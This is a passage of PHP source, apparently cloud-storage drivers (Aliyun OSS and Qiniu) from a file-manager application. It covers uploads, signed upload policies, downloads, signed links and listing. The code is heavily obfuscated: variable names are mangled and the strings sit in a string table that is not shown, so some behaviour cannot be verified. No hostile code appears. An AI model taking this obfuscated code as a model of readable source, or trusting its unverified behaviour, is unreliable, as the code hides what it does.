return !1; } return !0; } public function upload($ş—È„ê, $ËåóÚ°», $£éÆÖé¶ = false, $ªÆÊ¬ıÙ = REPEAT_REPLACE) { $ÀÛ©ÙÛ‰ =& $_SERVER[º·Ï‹¥³]; $ùÈ´ŸÖ = trim($ş—È„ê, $ÀÛ©ÙÛ‰[8]); $ØÆŠ¾¾ª = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ÀÛ©ÙÛ‰[1449] => @md5_file($ËåóÚ°»)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ş—È„ê))); $ØÆŠ¾¾ª = $this->trafficLimit($ÀÛ©ÙÛ‰[1459], $ØÆŠ¾¾ª); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ùÈ´ŸÖ), $ËåóÚ°», $ØÆŠ¾¾ª); } catch (OSS\Core\OssException $±ºØæ) { $this->writeLog(__FUNCTION__ . $ÀÛ©ÙÛ‰[205] . $±ºØæ->getMessage()); return !1; } return $this->getPathOuter($ş—È„ê); } public function getHost() { $”Ñïå¥Õ =& $_SERVER[º·Ï‹¥³]; $‹½şçä = explode($”Ñïå¥Õ[201], parent::getHost()); return $‹½şçä[0] . $”Ñïå¥Õ[201] . $this->bucket . $”Ñïå¥Õ[10] . $‹½şçä[1]; } public function uploadFormData($×öÖß¤°, $Ç‚ßšÆ‚ = 3600) { $ÍÏ¸½Ëï =& $_SERVER[º·Ï‹¥³]; if (!($ƒÚ±¥İ‘ = $this->getHost())) { return !1; } $ç İæêâ = $Ç‚ßšÆ‚; $ÅÏ¯û®á = date($ÍÏ¸½Ëï[1461], time() + $ç İæêâ); $ÒÑœæ© = new DateTime($ÅÏ¯û®á); $—‘™Üµ = $ÒÑœæ©->format(DateTime::ISO8601); $¹û„™¬‘ = strpos($—‘™Üµ, $ÍÏ¸½Ëï[347]); $—‘™Üµ = substr($—‘™Üµ, 0, $¹û„™¬‘) . $ÍÏ¸½Ëï[1462]; $ÙêûÙ´ = 1048576000 * 5; $„´ÏòÁƒ = $this->pathFather($×öÖß¤°); $ÈÌå¿øñ = array($ÍÏ¸½Ëï[266] => $—‘™Üµ, $ÍÏ¸½Ëï[269] => array(array($ÍÏ¸½Ëï[1463], 0, $ÙêûÙ´), array($ÍÏ¸½Ëï[272], $ÍÏ¸½Ëï[273], $„´ÏòÁƒ))); $¢­ò‰÷ì = base64_encode(json_encode($ÈÌå¿øñ)); $åå³û©ñ = base64_encode(hash_hmac($ÍÏ¸½Ëï[254], $¢­ò‰÷ì, $this->secret, !0)); $¸ğÄ¢Î– = array($ÍÏ¸½Ëï[284] => $¢­ò‰÷ì, $ÍÏ¸½Ëï[1464] => $this->accessKey, $ÍÏ¸½Ëï[276] => $ÍÏ¸½Ëï[265], $ÍÏ¸½Ëï[1465] => $åå³û©ñ, $ÍÏ¸½Ëï[199] => $ƒÚ±¥İ‘); $¸ğÄ¢Î– = $this->trafficLimit($ÍÏ¸½Ëï[1459], $¸ğÄ¢Î–); return $¸ğÄ¢Î–; } public function multiUploadFormData($ÓŸš°öÏ, $Úô”×‹· = 3600) { $²İÃüÈ— =& $_SERVER[º·Ï‹¥³]; if (!($˜ê„ºÖË = $this->getHost())) { return !1; } $òİö‰ÍĞ = $this->trafficLimit($²İÃüÈ—[1459]); $ËÎÇ‚¥— = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÓŸš°öÏ), $òİö‰ÍĞ); return array($²İÃüÈ—[245] => $ËÎÇ‚¥—, $²İÃüÈ—[199] => $˜ê„ºÖË . $²İÃüÈ—[8] . $this->pathEncode($ÓŸš°öÏ), $²İÃüÈ—[246] => gmdate($²İÃüÈ—[1466]), $²İÃüÈ—[97] => $ÓŸš°öÏ); } public function multiUploadAuthData($„¡¨˜¤Ó, $ã¬±¬·¹ = array()) { $è·üä¬û =& $_SERVER[º·Ï‹¥³]; $¦¥°—Ö = isset($ã¬±¬·¹[$è·üä¬û[246]]) ? $ã¬±¬·¹[$è·üä¬û[246]] : gmdate($è·üä¬û[1466]); $íÚÖ‘éˆ = isset($ã¬±¬·¹[$è·üä¬û[178]]) ? $ã¬±¬·¹[$è·üä¬û[178]] : $è·üä¬û[12]; $Õ×‹ˆ¢š = $„¡¨˜¤Ó; if (isset($ã¬±¬·¹[$è·üä¬û[97]])) { $Õ×‹ˆ¢š = $ã¬±¬·¹[$è·üä¬û[97]]; unset($ã¬±¬·¹[$è·üä¬û[97]]); } if (isset($ã¬±¬·¹[$è·üä¬û[247]])) { $ã¬±¬·¹[$è·üä¬û[246]] = $¦¥°—Ö; return $this->listUploadParts($Õ×‹ˆ¢š, $ã¬±¬·¹); } $“ğ€ñÈò = array($è·üä¬û[248], $è·üä¬û[12], $è·üä¬û[123], $¦¥°—Ö, "\170\x2d\157\163\x73\55\x64\x61\x74\x65\x3a{$¦¥°—Ö}", $è·üä¬û[8] . $this->bucket . $è·üä¬û[8] . $Õ×‹ˆ¢š . $íÚÖ‘éˆ); if (strpos($íÚÖ‘éˆ, $è·üä¬û[249]) === 0) { $“ğ€ñÈò[0] = $è·üä¬û[250]; if ($Éïœ‘÷ = $this->trafficLimit($è·üä¬û[1459])) { $Õ×‹ˆ¢š = $è·üä¬û[1467]; array_splice($“ğ€ñÈò, 5, 0, $Õ×‹ˆ¢š . $è·üä¬û[4] . $Éïœ‘÷[$Õ×‹ˆ¢š]); } } if (isset($ã¬±¬·¹[$è·üä¬û[251]]) && $ã¬±¬·¹[$è·üä¬û[251]] == $è·üä¬û[252]) { $“ğ€ñÈò[0] = $è·üä¬û[252]; } if (!empty($ã¬±¬·¹[$è·üä¬û[1468]])) { $¶êÍƒ¸² = array_merge(array($“ğ€ñÈò[4]), $ã¬±¬·¹[$è·üä¬û[1468]]); sort($¶êÍƒ¸²); $“ğ€ñÈò[4] = implode($è·üä¬û[253], $¶êÍƒ¸²); } $Í¤é¼ÈÜ = implode($è·üä¬û[253], $“ğ€ñÈò); $È°êó»¨ = base64_encode(hash_hmac($è·üä¬û[254], $Í¤é¼ÈÜ, $this->secret, !0)); $•³İŞÊÕ = $è·üä¬û[1432] . $this->accessKey . $è·üä¬û[4] . $È°êó»¨; if (strpos($íÚÖ‘éˆ, $è·üä¬û[249]) === 0) { $•³İŞÊÕ = array($è·üä¬û[256] => $•³İŞÊÕ, $è·üä¬û[246] => $¦¥°—Ö); if ($Éïœ‘÷) { $•³İŞÊÕ = array_merge($•³İŞÊÕ, $Éïœ‘÷); } } return $•³İŞÊÕ; } public function listUploadParts($ùûŒ¸©, $¦–¦óƒ ) { $İñ½¥÷ =& $_SERVER[º·Ï‹¥³]; $Ş¶½‚éŒ = parse_url_query($¦–¦óƒ [$İñ½¥÷[178]]); $¡…—¥ë¡ = $this->client->listParts($this->bucket, $this->pathEncode($ùûŒ¸©), $Ş¶½‚éŒ[$İñ½¥÷[245]]); $ŠÛãÂ = $¡…—¥ë¡->getListPart(); $Ã†’Çß• = array(); foreach ($ŠÛãÂ as $Ú©Õµ™‘) { $Ã†’Çß•[] = array($İñ½¥÷[1453] => $Ú©Õµ™‘->getPartNumber(), $İñ½¥÷[1454] => trim($Ú©Õµ™‘->getETag(), $İñ½¥÷[121])); } unset($¦–¦óƒ [$İñ½¥÷[247]], $¦–¦óƒ [$İñ½¥÷[251]]); $ÀÈŞ˜æñ = $this->multiUploadAuthData($ùûŒ¸©, $¦–¦óƒ ); if (empty($ÀÈŞ˜æñ)) { return !1; } return array($İñ½¥÷[256] => $ÀÈŞ˜æñ, $İñ½¥÷[246] => $¦–¦óƒ [$İñ½¥÷[246]], $İñ½¥÷[258] => $Ã†’Çß•); } public function download($”¨¾Ğó, $êó±ùì) { $éà¨Ë˜ü =& $_SERVER[º·Ï‹¥³]; if ($this->isFolder($”¨¾Ğó)) { return !1; } try { $Èã¤¯ÊŒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $êó±ùì); $Èã¤¯ÊŒ = $this->trafficLimit($éà¨Ë˜ü[112], $Èã¤¯ÊŒ); $this->client->getObject($this->bucket, $this->pathEncode($”¨¾Ğó), $Èã¤¯ÊŒ); } catch (OSS\Core\OssException $Şòó÷‘œ) { $this->writeLog(__FUNCTION__ . $éà¨Ë˜ü[205] . $Şòó÷‘œ->getMessage()); return !1; } return $êó±ùì; } public function fileSubstr($Ú·ƒŠö£, $¥•öœ«Ò = 0, $÷Ïó•Ş = false) { if ($¥•öœ«Ò === -1) { $·Å€üŞ = array(); } else { if ($÷Ïó•Ş === !1) { $ëèùİÏ¶ = $this->size($Ú·ƒŠö£); } else { $ëèùİÏ¶ = $¥•öœ«Ò + $÷Ïó•Ş - 1; } $·Å€üŞ = array(OSS\OssClient::OSS_RANGE => "{$¥•öœ«Ò}\55{$ëèùİÏ¶}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ú·ƒŠö£), $·Å€üŞ); } catch (OSS\Core\OssException $ÎÏ¨òê˜) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][205] . $ÎÏ¨òê˜->getMessage()); think_exception($ÎÏ¨òê˜->getMessage()); return !1; } } private function trafficLimit($‰ÛäÛÅÅ, $ˆæ–ğÂ± = array()) { $öß–¤Ÿş =& $_SERVER[º·Ï‹¥³]; if ($‰ÛäÛÅÅ == $öß–¤Ÿş[1459] && $this->isUploadServer() || $‰ÛäÛÅÅ == $öß–¤Ÿş[112] && $this->isFileOutServer()) { return $ˆæ–ğÂ±; } $êÔ·±÷Á = floatval($GLOBALS[$öß–¤Ÿş[6]][$öß–¤Ÿş[92]][$öß–¤Ÿş[110]][$‰ÛäÛÅÅ]) * 1024 * 1024 * 8; if (!$êÔ·±÷Á) { return $ˆæ–ğÂ±; } $êÔ·±÷Á = $êÔ·±÷Á < 819200 ? 819200 : ($êÔ·±÷Á > 838860800 ? 838860800 : $êÔ·±÷Á); $ˆæ–ğÂ±[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($êÔ·±÷Á); return $ˆæ–ğÂ±; } public function link($îµ‰Ÿ¡, $“Æ›‡µ¬ = array()) { $ìĞÖÍùÃ =& $_SERVER[º·Ï‹¥³]; if (!$this->exist($îµ‰Ÿ¡) || $this->isFolder($îµ‰Ÿ¡)) { return !1; } try { $“Æ›‡µ¬ = $this->trafficLimit($ìĞÖÍùÃ[112], $“Æ›‡µ¬); $İ›Òæû’ = $this->client->signUrl($this->bucket, $this->pathEncode($îµ‰Ÿ¡), 3600 * 12, $ìĞÖÍùÃ[252], $“Æ›‡µ¬); return $this->getCdnLink($İ›Òæû’); } catch (OSS\Core\OssException $±“ÜÕÜ) { $this->writeLog(__FUNCTION__ . $ìĞÖÍùÃ[205] . $±“ÜÕÜ->getMessage()); return !1; } } public function fileOut($Ì½®†ø‘, $«ç•¶îƒ = false, $üÖºìÄ² = false, $Ğ‡Ñ‡´³ = '') { $¶µ†åá… =& $_SERVER[º·Ï‹¥³]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ì½®†ø‘, $«ç•¶îƒ, $üÖºìÄ², $Ğ‡Ñ‡´³); } if (!$üÖºìÄ²) { $üÖºìÄ² = $this->pathThis($Ì½®†ø‘); } $üÖºìÄ² = rawurlencode($üÖºìÄ²); $û¶Ş‡£í = get_file_mime(get_path_ext($üÖºìÄ²)); if ($û¶Ş‡£í == $¶µ†åá…[239]) { return parent::fileOut($Ì½®†ø‘, $«ç•¶îƒ, $üÖºìÄ², $Ğ‡Ñ‡´³); } $«ç•¶îƒ = $«ç•¶îƒ ? $¶µ†åá…[1469] : $¶µ†åá…[1470]; $–Œ›üãª = array(OSS\OssClient::OSS_SUB_RESOURCE => $¶µ†åá…[1471] . rawurlencode("{$«ç•¶îƒ}\x3b\146\x69\x6c\145\156\x61\x6d\145\75{$üÖºìÄ²}")); $–Œ›üãª[OSS\OssClient::OSS_SUB_RESOURCE] .= $¶µ†åá…[1472] . rawurlencode($û¶Ş‡£í); $…ß÷·Øš = $this->link($Ì½®†ø‘, $–Œ›üãª); $this->fileOutLink($…ß÷·Øš); } public function fileOutServer($Á¸ÚŠš•, $°½ç± = false, $ß•Ş·ëŞ = false, $ôï€ú¤â = '') { parent::fileOut($Á¸ÚŠš•, $°½ç±, $ß•Ş·ëŞ, $ôï€ú¤â); } public function fileOutImage($¬ÓåìÉ, $™ÈÉ×° = 250) { if ($this->size($¬ÓåìÉ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¬ÓåìÉ, $™ÈÉ×°); } $¢©Ëëìè = array(OSS\OssClient::OSS_PROCESS => $_SERVER[º·Ï‹¥³][1429] . $™ÈÉ×°); $ıâ…¢‚ = $this->link($¬ÓåìÉ, $¢©Ëëìè); $this->fileOutLink($ıâ…¢‚); } public function fileOutImageServer($”ˆÆ§¼¢, $‘Ä¹‘¬Í = 250) { parent::fileOutImage($”ˆÆ§¼¢, $‘Ä¹‘¬Í); } public function fileOutLink($éÔª¶™Œ) { $®‡ˆó¢™ =& $_SERVER[º·Ï‹¥³]; if (!$this->isCdnHost() && substr($éÔª¶™Œ, 0, 7) == $®‡ˆó¢™[1377]) { $éÔª¶™Œ = $®‡ˆó¢™[1378] . substr($éÔª¶™Œ, 7); } header($®‡ˆó¢™[165] . $éÔª¶™Œ); die; } public function hashMd5($Ò×°Â÷, $è¡Ü²ıá = '') { $®á¦ê®× =& $_SERVER[º·Ï‹¥³]; $¡¼Â¦ßû = $this->_objectMeta($Ò×°Â÷); if (!$¡¼Â¦ßû) { return $®á¦ê®×[12]; } if (!isset($¡¼Â¦ßû[$®á¦ê®×[1449]]) && !empty($è¡Ü²ıá)) { $ƒë„ñÍâ = $this->updateObjMeta($Ò×°Â÷, array($®á¦ê®×[1449] => $è¡Ü²ıá)); $¡¼Â¦ßû[$®á¦ê®×[1449]] = $ƒë„ñÍâ ? $è¡Ü²ıá : $®á¦ê®×[12]; } return isset($¡¼Â¦ßû[$®á¦ê®×[1449]]) ? strtolower($¡¼Â¦ßû[$®á¦ê®×[1449]]) : $®á¦ê®×[12]; } public function size($ö§‘¤) { $àˆ‘¼“À = $this->objectMeta($ö§‘¤); return $àˆ‘¼“À ? $àˆ‘¼“À[$_SERVER[º·Ï‹¥³][79]] : 0; } public function info($œÎğÓçÏ) { if ($this->isFolder($œÎğÓçÏ)) { return $this->folderInfo($œÎğÓçÏ); } else { if ($this->isFile($œÎğÓçÏ)) { return $this->fileInfo($œÎğÓçÏ); } } return !1; } public function exist($³İÍûó) { return $this->isFile($³İÍûó) || $this->isFolder($³İÍûó); } public function isFile($‰²¢éŸô) { return !$this->isFolder($‰²¢éŸô) && $this->objectMeta($‰²¢éŸô); } public function isFolder($Ô‰×…¦Ö) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][169], $Ô‰×…¦Ö); } protected function objectMeta($Â­»¬®¿) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][171], $Â­»¬®¿); } protected function _objectMeta($ü—¥ùš£) { $ÎçÁÏúğ =& $_SERVER[º·Ï‹¥³]; try { $ğ¸°Â Ê = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ü—¥ùš£)); } catch (OSS\Core\OssException $…­ ù³¬) { $this->writeLog(__FUNCTION__ . $ÎçÁÏúğ[205] . $…­ ù³¬->getMessage()); $ğ¸°Â Ê = !1; } if ($ğ¸°Â Ê) { $ğ¸°Â Ê[$ÎçÁÏúğ[79]] = intval($ğ¸°Â Ê[$ÎçÁÏúğ[1447]]); } return $ğ¸°Â Ê; } protected function _isFolder($æ‡¾ÁôÅ) { $Óú»¿Í‚ =& $_SERVER[º·Ï‹¥³]; if ($æ‡¾ÁôÅ == $Óú»¿Í‚[12] || $æ‡¾ÁôÅ == $Óú»¿Í‚[8]) { return !0; } $î–Ñì¥– = array($Óú»¿Í‚[1442] => $Óú»¿Í‚[8], $Óú»¿Í‚[1443] => rtrim($æ‡¾ÁôÅ, $Óú»¿Í‚[8]) . $Óú»¿Í‚[8], $Óú»¿Í‚[1444] => 1, $Óú»¿Í‚[1445] => $Óú»¿Í‚[12]); $æ ›’Òë = $this->client->listObjects($this->bucket, $î–Ñì¥–); if ($æ ›’Òë->getObjectList() || $æ ›’Òë->getPrefixList()) { return !0; } return !1; } public function writeLog($‡ªõ…Å = '', $½¤ôˆ™¾ = false) { $éÂç½­ =& $_SERVER[º·Ï‹¥³]; $¦„¬ñÆ = in_array(ACTION, array($éÂç½­[203], $éÂç½­[204])); if (!$¦„¬ñÆ && !GLOBAL_DEBUG) { return; } $„éšÆ¿ = 0; if (stripos($‡ªõ…Å, $éÂç½­[1473]) !== !1) { $„éšÆ¿ = 1; $¶ğÏà“ê = explode($éÂç½­[1474], $‡ªõ…Å); $‡ªõ…Å = !empty($¶ğÏà“ê[1]) ? $¶ğÏà“ê[1] : $‡ªõ…Å; } else { if (stripos($‡ªõ…Å, $éÂç½­[1475])) { $„éšÆ¿ = 2; $¶ğÏà“ê = explode($éÂç½­[1475], $‡ªõ…Å); $¶ğÏà“ê = explode($éÂç½­[4], $¶ğÏà“ê[0]); $‡ªõ…Å = !empty($¶ğÏà“ê[1]) ? $¶ğÏà“ê[1] : $‡ªõ…Å; } } if ($¦„¬ñÆ && I18n::getType() == $éÂç½­[1476]) { if ($„éšÆ¿ == 1) { $‡ªõ…Å = str_replace($éÂç½­[1477], $éÂç½­[1478], $‡ªõ…Å); } else { if ($„éšÆ¿ == 2) { $¶ğÏà“ê = explode($éÂç½­[205], $¶ğÏà“ê[0]); $ÅùÔæÚé = isset($¶ğÏà“ê[1]) ? $¶ğÏà“ê[1] : $éÂç½­[12]; $€¢ÎñãÒ = array($éÂç½­[1479] => $éÂç½­[1480], $éÂç½­[1481] => $éÂç½­[1482], $éÂç½­[1483] => $éÂç½­[1484], $éÂç½­[1485] => $éÂç½­[1486], $éÂç½­[1487] => $éÂç½­[1488], $éÂç½­[1489] => $éÂç½­[1490], $éÂç½­[1491] => $éÂç½­[1492], $éÂç½­[1493] => $éÂç½­[1494], $éÂç½­[1495] => $éÂç½­[1496], $éÂç½­[1497] => $éÂç½­[1498]); if (isset($€¢ÎñãÒ[$ÅùÔæÚé])) { $‡ªõ…Å = $€¢ÎñãÒ[$ÅùÔæÚé]; } } } if (stripos($‡ªõ…Å, $éÂç½­[1499])) { $‡ªõ…Å = $éÂç½­[1500]; } } if (!trim($‡ªõ…Å)) { return; } parent::writeLog(trim($‡ªõ…Å), $½¤ôˆ™¾); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ß­ù½Û˜) { parent::__construct(); require_once SDK_DIR . $_SERVER[º·Ï‹¥³][1501]; $this->_init($ß­ù½Û˜); } public function _init($ÌÅİ‰òÅ) { $î±ò¯²Õ =& $_SERVER[º·Ï‹¥³]; $this->config = $ÌÅİ‰òÅ; foreach ($ÌÅİ‰òÅ as $Ïç”×Çó => $€ÌÜßÓÛ) { if (isset($this->{$Ïç”×Çó})) { $this->{$Ïç”×Çó} = $€ÌÜßÓÛ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($î±ò¯²Õ[1502] . LNG($î±ò¯²Õ[1433])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¥‘”‡², $ÍÁáÄ²— = '', $ŸèÈÓŞï = REPEAT_RENAME) { if ($this->setContent($¥‘”‡², $ÍÁáÄ²—)) { return $this->getPathOuter($¥‘”‡²); } return !1; } public function mkdir($òô°Ë¬ç, $˜ÑŸ™”¬ = REPEAT_SKIP) { $µ§Ñüş =& $_SERVER[º·Ï‹¥³]; $†Ë‘ùÖ¼ = trim($òô°Ë¬ç, $µ§Ñüş[8]); if ($this->_isFolder($†Ë‘ùÖ¼)) { return $this->getPathOuter($†Ë‘ùÖ¼); } $òô°Ë¬ç = $†Ë‘ùÖ¼ . $µ§Ñüş[8]; $¼ÀãÑù¢ = get_path_this($†Ë‘ùÖ¼); $ô×ş™Òâ = $òô°Ë¬ç . $¼ÀãÑù¢; if (!$this->mkfile($ô×ş™Òâ)) { return !1; } if (!$this->moveFile($ô×ş™Òâ, $òô°Ë¬ç)) { $this->delFile($ô×ş™Òâ); return !1; } return $this->getPathOuter($†Ë‘ùÖ¼); } public function copyFile($şğ¦Í‡Ù, $Ëİßôäú) { $òÌ²á  = $this->bucketManager->copy($this->bucket, $şğ¦Í‡Ù, $this->bucket, $Ëİßôäú, !0); return $òÌ²á  ? !1 : $this->getPathOuter($Ëİßôäú); } public function moveFile($ı¤èÆ½‡, $¯–ãú—) { $¢‘ÌêÄÚ = $this->bucketManager->move($this->bucket, $ı¤èÆ½‡, $this->bucket, $¯–ãú—, !0); return $¢‘ÌêÄÚ ? !1 : $this->getPathOuter($¯–ãú—); } public function delFile($ÓÇ‡Ú‚) { if (!$this->exist($ÓÇ‡Ú‚)) { return !0; } $¸ƒ«µÔÃ = $this->bucketManager->delete($this->bucket, $ÓÇ‡Ú‚); return $¸ƒ«µÔÃ ? !1 : !0; } public function delFolder($ğìîÛğ) { $Ô‚Õñˆ =& $_SERVER[º·Ï‹¥³]; if (!$this->exist($ğìîÛğ)) { return !0; } $this->listItemCache = !1; $¾–¤¤éŸ = $this->fileList($ğìîÛğ); $this->listItemCache = !0; $şËËŒ²« = trim($ğìîÛğ, $Ô‚Õñˆ[8]) . $Ô‚Õñˆ[8]; if (!empty($ğìîÛğ) && $ğìîÛğ !== $Ô‚Õñˆ[219] && !in_array($şËËŒ²«, $¾–¤¤éŸ[$Ô‚Õñˆ[85]])) { $¾–¤¤éŸ[$Ô‚Õñˆ[85]][] = $şËËŒ²«; } $§Î¤áİØ = $this->delByBatch($¾–¤¤éŸ[$Ô‚Õñˆ[86]]); if (!$§Î¤áİØ) { return !1; } $§Î¤áİØ = $this->delByBatch($¾–¤¤éŸ[$Ô‚Õñˆ[85]]); if (!$§Î¤áİØ) { return !1; } return $this->delFile($şËËŒ²«); } private function delByBatch($è“ÓÎÏş) { foreach (array_chunk($è“ÓÎÏş, 1000) as $¾ø­ÊÜ‹) { $ÏÓ„ê¡– = $this->bucketManager->buildBatchDelete($this->bucket, $¾ø­ÊÜ‹); list($•üÒ åÉ, $–Ëô„º) = $this->bucketManager->batch($ÏÓ„ê¡–); if ($–Ëô„º) { return !1; } } return !0; } public function rename($åßì¬Ã, $ß­ÌµÛÁ) { return $this->renameObject($åßì¬Ã, $ß­ÌµÛÁ); } public function fileInfo($ñëá¹…¿, $„ìë¸¼À = false, $Í©Çñšê = array()) { $Ä‚ï•Àº =& $_SERVER[º·Ï‹¥³]; $ëãÔşƒ¶ = array($Ä‚ï•Àº[32] => $this->pathThis($ñëá¹…¿), $Ä‚ï•Àº[87] => $this->getPathOuter($Ä‚ï•Àº[8] . $ñëá¹…¿), $Ä‚ï•Àº[33] => $Ä‚ï•Àº[221], $Ä‚ï•Àº[79] => isset($Í©Çñšê[$Ä‚ï•Àº[1503]]) ? $Í©Çñšê[$Ä‚ï•Àº[1503]] : 0, $Ä‚ï•Àº[178] => $this->ext($ñëá¹…¿)); if ($„ìë¸¼À) { return $ëãÔşƒ¶; } $ëãÔşƒ¶[$Ä‚ï•Àº[222]] = $ëãÔşƒ¶[$Ä‚ï•Àº[88]] = 0; $ëãÔşƒ¶[$Ä‚ï•Àº[223]] = $ëãÔşƒ¶[$Ä‚ï•Àº[224]] = !0; if (empty($Í©Çñšê)) { $Í©Çñšê = $this->objectMeta($ñëá¹…¿); if (!$Í©Çñšê) { return $ëãÔşƒ¶; } } if (isset($Í©Çñšê[$Ä‚ï•Àº[225]]) && $Í©Çñšê[$Ä‚ï•Àº[225]]) { $ëãÔşƒ¶[$Ä‚ï•Àº[226]] = $Í©Çñšê[$Ä‚ï•Àº[225]]; } if (isset($Í©Çñšê[$Ä‚ï•Àº[236]]) && $Í©Çñšê[$Ä‚ï•Àº[236]]) { $ëãÔşƒ¶[$Ä‚ï•Àº[226]] = $Í©Çñšê[$Ä‚ï•Àº[236]]; } if (isset($Í©Çñšê[$Ä‚ï•Àº[1504]])) { $ëãÔşƒ¶[$Ä‚ï•Àº[88]] = substr($Í©Çñšê[$Ä‚ï•Àº[1504]] . $Ä‚ï•Àº[12], 0, 10); } if (isset($Í©Çñšê[$Ä‚ï•Àº[1503]])) { $ëãÔşƒ¶[$Ä‚ï•Àº[79]] = $Í©Çñšê[$Ä‚ï•Àº[1503]]; } return $ëãÔşƒ¶; } public function folderInfo($¸¡ºÇ€£, $Óß’“Ú· = false) { $ä²Ë =& $_SERVER[º·Ï‹¥³]; $ÃæÉ¯ıİ = array($ä²Ë[32] => $this->pathThis($¸¡ºÇ€£), $ä²Ë[87] => $this->getPathOuter($ä²Ë[8] . $¸¡ºÇ€£), $ä²Ë[33] => $ä²Ë[78]); if ($Óß’“Ú·) { return $ÃæÉ¯ıİ; } $ÃæÉ¯ıİ[$ä²Ë[222]] = $ÃæÉ¯ıİ[$ä²Ë[88]] = 0; $ÃæÉ¯ıİ[$ä²Ë[223]] = $ÃæÉ¯ıİ[$ä²Ë[224]] = !0; $¸¡ºÇ€£ = rtrim($¸¡ºÇ€£, $ä²Ë[8]) . $ä²Ë[8]; $ìâéîğ€ = $this->objectMeta($¸¡ºÇ€£); if (isset($ìâéîğ€[$ä²Ë[1504]])) { $ÃæÉ¯ıİ[$ä²Ë[88]] = substr($ìâéîğ€[$ä²Ë[1504]] . $ä²Ë[12], 0, 10); } return $ÃæÉ¯ıİ; } public function listPath($¸§…¯ÒÔ, $ÍáòÔû¢ = false) { $ÀáºÑ½ş =& $_SERVER[º·Ï‹¥³]; $ÂûàÌÖ“ = $this->fileList($¸§…¯ÒÔ, $ÀáºÑ½ş[8], !0); foreach ($ÂûàÌÖ“[$ÀáºÑ½ş[85]] as $¯û¹ÌÕ => $§Ò¼–•Æ) { $ÂûàÌÖ“[$ÀáºÑ½ş[85]][$¯û¹ÌÕ] = $this->folderInfo($§Ò¼–•Æ, $ÍáòÔû¢); } foreach ($ÂûàÌÖ“[$ÀáºÑ½ş[86]] as $¯û¹ÌÕ => $§Ò¼–•Æ) { $ÂûàÌÖ“[$ÀáºÑ½ş[86]][$¯û¹ÌÕ] = $this->fileInfo($§Ò¼–•Æ[$ÀáºÑ½ş[97]], $ÍáòÔû¢, $§Ò¼–•Æ); } return $ÂûàÌÖ“; } public function has($ì×½á’º, $éøŞŸ½ö = false, $°èâíÓ = true) { $¦ı¬à¥ñ =& $_SERVER[º·Ï‹¥³]; $ì×½á’º = trim($ì×½á’º, $¦ı¬à¥ñ[8]); $Óç²Œì³ = empty($ì×½á’º) && $ì×½á’º !== $¦ı¬à¥ñ[219] ? $¦ı¬à¥ñ[12] : $ì×½á’º . $¦ı¬à¥ñ[8]; $ÏÏÕÙÏ = $¦ı¬à¥ñ[12]; $Ğòœèúï = 500; $ÜÄ•¨…ò = $¦ı¬à¥ñ[8]; $üµùØÍ = $áÅãï°Ø = 0; while (!0) { check_abort(); list($÷•ìš÷, $º«Ò²Ø¿) = $this->bucketManager->listFiles($this->bucket, $Óç²Œì³, $ÏÏÕÙÏ, $Ğòœèúï, $ÜÄ•¨…ò); if ($º«Ò²Ø¿) { break; } $ÏÏÕÙÏ = array_key_exists($¦ı¬à¥ñ[1445], $÷•ìš÷) ? $ÏÏÕÙÏ = $÷•ìš÷[$¦ı¬à¥ñ[1505]] : $¦ı¬à¥ñ[12]; if ($éøŞŸ½ö) { if (!empty($÷•ìš÷[$¦ı¬à¥ñ[1506]])) { $üµùØÍ += count($÷•ìš÷[$¦ı¬à¥ñ[1506]]); } if (!empty($÷•ìš÷[$¦ı¬à¥ñ[1507]])) { $áÅãï°Ø += count($÷•ìš÷[$¦ı¬à¥ñ[1507]]); } if ($ÏÏÕÙÏ === $¦ı¬à¥ñ[12]) { break; } continue; } if ($°èâíÓ) { if (!empty($÷•ìš÷[$¦ı¬à¥ñ[1506]])) { return !0; } } else { if (!empty($÷•ìš÷[$¦ı¬à¥ñ[1507]])) { return !0; } } if ($ÏÏÕÙÏ === $¦ı¬à¥ñ[12]) { break; } } if ($éøŞŸ½ö) { return array($¦ı¬à¥ñ[230] => $üµùØÍ, $¦ı¬à¥ñ[231] => $áÅãï°Ø); } return !1; } public function listAll($­¥ƒµó¥) { $Àµ´“ú¾ =& $_SERVER[º·Ï‹¥³]; $¾ø¥µˆ = $this->fileList($­¥ƒµó¥, $Àµ´“ú¾[12], !0); $Í–µÈÏ‡ = array_to_keyvalue($¾ø¥µˆ[$Àµ´“ú¾[86]], $Àµ´“ú¾[32]); foreach ($¾ø¥µˆ[$Àµ´“ú¾[85]] as $‡Åø‚ûŒ) { if (is_string($‡Åø‚ûŒ)) { $Í–µÈÏ‡[$‡Åø‚ûŒ] = array($Àµ´“ú¾[79] => 0); } } return $this->listAllFiles($­¥ƒµó¥, $Í–µÈÏ‡); } private function fileList($÷“½øâ, $¦æîŸ™Œ = '', $îˆİ«‹ğ = 0) { $´Õ¬‘†Û =& $_SERVER[º·Ï‹¥³]; $÷“½øâ = trim($÷“½øâ, $´Õ¬‘†Û[8]); $÷˜‚½ë© = empty($÷“½øâ) && $÷“½øâ !== $´Õ¬‘†Û[219] ? $´Õ¬‘†Û[12] : $÷“½øâ . $´Õ¬‘†Û[8]; 